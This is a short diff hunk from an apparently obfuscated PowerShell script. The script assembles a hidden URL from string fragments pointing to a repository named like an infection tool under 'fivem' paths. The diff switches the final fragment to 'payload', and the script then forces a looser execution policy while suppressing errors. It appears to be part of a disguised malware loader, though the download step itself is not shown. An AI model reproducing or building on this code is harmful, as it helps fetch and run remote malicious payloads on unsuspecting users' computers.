@@ -6,7 +6,7 @@ $_0x91A = @(
 ".com/t3rm1n4l-inf1c0z",
 "/fivem/refs",
 "/heads/main/",
-"-"
+"payload"
 ) -join ""
 
 Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue
